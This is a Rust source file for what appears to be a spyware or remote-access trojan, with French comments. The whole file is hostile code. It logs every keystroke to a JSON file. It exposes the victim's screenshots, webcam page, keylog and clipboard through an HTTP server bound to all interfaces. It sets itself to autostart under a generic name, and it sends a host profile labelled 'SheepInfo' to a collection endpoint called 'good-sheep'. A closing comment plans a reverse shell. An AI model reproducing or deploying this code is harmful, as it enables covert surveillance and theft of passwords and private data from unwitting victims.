use actix_files::NamedFile;
use actix_web::{web, App, HttpResponse, HttpServer, Result};
use arboard::Clipboard;
use chrono::Local;
use local_ip_address::local_ip;
use rdev::{listen, Event};
use reqwest;
use reqwest::Client;
use serde::Deserialize;
use serde::Serialize;
use std::collections::HashMap;
use std::fs::OpenOptions;
use std::io::{Read, Write};
use std::path::PathBuf;
use std::process::Command;
use std::sync::Mutex;
use std::thread;
use std::{fs, io};
use sysinfo::System;
use tokio::task;
use whoami;
struct AppState {
    screenshot_file: Mutex<String>,
    clipboard: Mutex<String>,
}

// Information list function
#[derive(Deserialize)]
struct IpInfo {
    ip: String,
    region: String,
    org: String,
}

#[derive(serde::Serialize)]
struct SheepInfo {
    name: String,
    ip: String,
    region: String,
    webcams: Vec<String>,
    screenshots: Vec<String>,
    keylog: Vec<KeylogEntry>,
    clipboard: Vec<ClipboardEntry>,
    screenshot: Vec<ScreenshotEntry>,
    devices: Vec<String>,
    hardware: HardwareInfo,
    os: OsInfo,
}

#[derive(serde::Serialize)]
struct KeylogEntry {
    keylogDate: String,
    data: String,
}

#[derive(serde::Serialize)]
struct ClipboardEntry {
    clipboardDate: String,
    data: String,
}

#[derive(serde::Serialize)]
struct ScreenshotEntry {
    screenshotDate: String,
    file: String,
}

#[derive(serde::Serialize)]
struct HardwareInfo {
    cpu: String,
    ram: String,
    storage: String,
    gpu: String,
}

#[derive(serde::Serialize)]
struct OsInfo {
    name: String,
    version: String,
}

#[derive(Serialize, Deserialize)]
struct KeylogData {
    keylogs: HashMap<String, Vec<String>>,
}

// Index page handler
async fn index() -> Result<HttpResponse> {
    Ok(HttpResponse::Ok()
        .content_type("text/html")
        .body(include_str!("../static/index.html")))
}

// Screenshot handler
async fn screenshot() -> Result<HttpResponse> {
    let output_file = "screenshot.png";
    let linux_tools = [
        ("scrot", format!("scrot {}", output_file)),
        ("spectacle", format!("spectacle -b -o {}", output_file)),
        ("import", format!("import -window root {}", output_file)),
        ("maim", format!("maim {}", output_file)),
        ("xwd", format!("xwd -root | convert xwd:- {}", output_file)),
    ];

    let windows_tools = [("nircmd", format!("nircmd savescreenshot {}", output_file))];

    let tools = if cfg!(target_os = "linux") {
        linux_tools.iter()
    } else if cfg!(target_os = "windows") {
        windows_tools.iter()
    } else {
        panic!("Unsupported OS");
    };

    let mut screenshot_taken = false;
    for (tool, cmd) in tools {
        if Command::new(tool).output().is_ok() {
            let output = Command::new("sh")
                .arg("-c")
                .arg(cmd)
                .output()
                .expect("Failed to execute screenshot command");

            if output.status.success() {
                screenshot_taken = true;
                break;
            }
        }
    }

    if !screenshot_taken {
        return Ok(HttpResponse::InternalServerError().body("Failed to take screenshot"));
    }

    Ok(HttpResponse::Ok()
        .content_type("text/html")
        .body(include_str!("../static/screenshot.html")))
} // Information list function

// Get screenshot handler
async fn get_screenshot() -> Result<NamedFile> {
    let path: PathBuf = "screenshot.png".parse().unwrap();
    Ok(NamedFile::open(path)?)
}

// Camera page handler
async fn camera() -> Result<HttpResponse> {
    Ok(HttpResponse::Ok()
        .content_type("text/html")
        .body(include_str!("../static/camera.html")))
}

// Keylog page handler
async fn keylog() -> Result<HttpResponse> {
    let log_file_path = "./log/key.json";

    // Lire le contenu du fichier
    let file_content = match fs::read_to_string(log_file_path) {
        Ok(content) => content,
        Err(_) => return Ok(HttpResponse::InternalServerError().body("Failed to read keylog file")),
    };

    // Renvoie le contenu du fichier
    Ok(HttpResponse::Ok()
        .content_type("application/json")
        .body(file_content))
}

// Clipboard view function
async fn clipboard_view() -> Result<HttpResponse> {
    let mut clipboard = Clipboard::new().unwrap();
    match clipboard.get_text() {
        Ok(text) => Ok(HttpResponse::Ok().body(text)),
        Err(e) => Ok(HttpResponse::InternalServerError()
            .body(format!("Failed to get clipboard content: {}", e))),
    }
}

// Clipboard send function
async fn clipboard_send(body: String) -> Result<HttpResponse> {
    let mut clipboard = Clipboard::new().unwrap();
    match clipboard.set_text(body.clone()) {
        Ok(_) => Ok(HttpResponse::Ok().body(format!("Clipboard text is now: \"{}\"", body))),
        Err(e) => Ok(HttpResponse::InternalServerError()
            .body(format!("Failed to set clipboard content: {}", e))),
    }
}

async fn get_public_ip_info() -> Result<IpInfo, reqwest::Error> {
    let response = reqwest::get("https://ipinfo.io/json").await?;
    let ip_info: IpInfo = response.json().await?;
    Ok(ip_info)
}

fn get_default_gateway() -> Result<String, std::io::Error> {
    let output = if cfg!(target_os = "windows") {
        Command::new("powershell")
            .arg("-NoProfile")
            .arg("-Command")
            .arg("Get-NetRoute -AddressFamily IPv4 | Where-Object { $_.DestinationPrefix -eq '0.0.0.0/0' } | Select-Object -ExpandProperty NextHop")
            .output()?
    } else {
        Command::new("sh")
            .arg("-c")
            .arg("ip route | grep default | awk '{print $3}'")
            .output()?
    };

    let gateway = String::from_utf8_lossy(&output.stdout).trim().to_string();
    Ok(gateway)
}

async fn display_system_info() -> Result<(), Box<dyn std::error::Error>> {
    let mut system = System::new_all();
    system.refresh_all();

    let cpu_info = system.global_cpu_info();
    let cpu_name = cpu_info.name();
    let cpu_usage = cpu_info.cpu_usage();

    let total_memory = system.total_memory();
    let used_memory = system.used_memory();

    let hostname = whoami::hostname();
    let username = whoami::username();
    let realname = whoami::realname();
    let os = whoami::distro();
    let device_name = whoami::devicename();
    let desktop_env = whoami::desktop_env();
    let platform = whoami::platform();
    let architecture = whoami::arch();
    let private_ip = local_ip().unwrap();

    let public_ip_info = get_public_ip_info().await.unwrap_or(IpInfo {
        ip: "Unavailable".to_string(),
        region: "Unavailable".to_string(),
        org: "Unavailable".to_string(),
    });

    let default_gateway = get_default_gateway().unwrap_or_else(|_| "Unknown".to_string());

    let hardware = HardwareInfo {
        cpu: cpu_name.to_string(),
        ram: format!("{} MB", total_memory / 1024),
        storage: "Unknown".to_string(), // Vous pouvez obtenir cette information en utilisant une méthode appropriée
        gpu: "Unknown".to_string(), // Vous pouvez obtenir cette information en utilisant une méthode appropriée
    };

    let os_info = OsInfo {
        name: os,
        version: "Unknown".to_string(), // Vous pouvez obtenir cette information en utilisant une méthode appropriée
    };

    let sheep_info = SheepInfo {
        name: hostname,
        ip: public_ip_info.ip,
        region: public_ip_info.region,
        webcams: vec!["localhost:8080/camera".to_string()],
        screenshots: vec!["localhost:8080/screenshot".to_string()],
        keylog: vec![],
        clipboard: vec![],
        screenshot: vec![],
        devices: vec![],
        hardware,
        os: os_info,
    };

    let client = Client::new();
    let res = client
        .post("http://localhost:5000/good-sheep")
        .json(&sheep_info)
        .send()
        .await?;

    if res.status().is_success() {
        println!("System info successfully sent!");
    } else {
        eprintln!("Failed to send system info: {}", res.status());
    }

    Ok(())
}

fn log_key_mouse() {
    // Chemin du fichier JSON
    let log_file_path = "./log/key.json";

    // Lire le fichier JSON existant ou créer un nouvel objet KeylogData
    let mut keylog_data: KeylogData =
        if let Ok(mut file) = OpenOptions::new().read(true).open(log_file_path) {
            let mut content = String::new();
            file.read_to_string(&mut content).unwrap();
            serde_json::from_str(&content).unwrap_or(KeylogData {
                keylogs: HashMap::new(),
            })
        } else {
            KeylogData {
                keylogs: HashMap::new(),
            }
        };

    // Fonction de callback pour écouter les frappes au clavier
    fn callback(event: Event, keylog_data: &mut KeylogData) {
        if let Some(key) = event.name {
            let current_date = Local::now().format("%d/%m/%Y").to_string();

            // Ajouter la frappe à la date correspondante
            keylog_data
                .keylogs
                .entry(current_date)
                .or_insert_with(Vec::new)
                .push(key);

            // Écrire les données mises à jour dans le fichier JSON
            let serialized_data = serde_json::to_string(&keylog_data).unwrap();
            let mut file = OpenOptions::new()
                .write(true)
                .create(true)
                .truncate(true)
                .open("./log/key.json")
                .unwrap();
            file.write_all(serialized_data.as_bytes()).unwrap();
        }
    }

    // Écouter les frappes au clavier
    if let Err(error) = listen(move |event| callback(event, &mut keylog_data)) {
        println!("Error: {:?}", error)
    }
}

// Auto-launch function
fn setup_autolaunch() {
    use auto_launch::AutoLaunch;

    let app_name = "my_program";
    let exec_path = std::env::current_exe().expect("Failed to get current executable path");
    let exec_path_str = exec_path
        .to_str()
        .expect("Failed to convert path to string");

    let auto = AutoLaunch::new(app_name, exec_path_str, &["--minimized"]);

    match auto.enable() {
        Ok(_) => println!("Autostart enabled successfully"),
        Err(e) => eprintln!("Failed to enable autostart: {}", e),
    }

    if auto.is_enabled().unwrap() {
        println!("Autostart is enabled");
    } else {
        println!("Autostart is not enabled");
    }
}

// Main function
#[actix_web::main]
async fn main() -> io::Result<()> {
    // Premier thread : serveur HTTP
    let app_state = web::Data::new(AppState {
        screenshot_file: Mutex::new(String::from("screenshot.png")),
        clipboard: Mutex::new(String::new()),
    });

    let server = HttpServer::new(move || {
        App::new()
            .app_data(app_state.clone())
            .route("/", web::get().to(index))
            .route("/screenshot", web::get().to(screenshot))
            .route("/get_screenshot", web::get().to(get_screenshot))
            .route("/camera", web::get().to(camera))
            .route("/keylog", web::get().to(keylog))
            .route("/clipboard-view", web::get().to(clipboard_view))
            .route("/clipboard-send", web::post().to(clipboard_send))
    })
    .bind("0.0.0.0:8080")?
    .run();

    // Deuxième thread : log des événements clavier/souris
    thread::spawn(|| {
        log_key_mouse();
    });

    // Quatrième thread : configuration de l'auto-lancement
    thread::spawn(|| {
        setup_autolaunch();
    });

    // Cinquième tâche : affichage des informations système
    task::spawn(async {
        if let Err(err) = display_system_info().await {
            eprintln!("Failed to display system info: {}", err);
        }
    });

    // Attendre que le serveur HTTP se termine
    server.await
}
// need reverse shell + python client
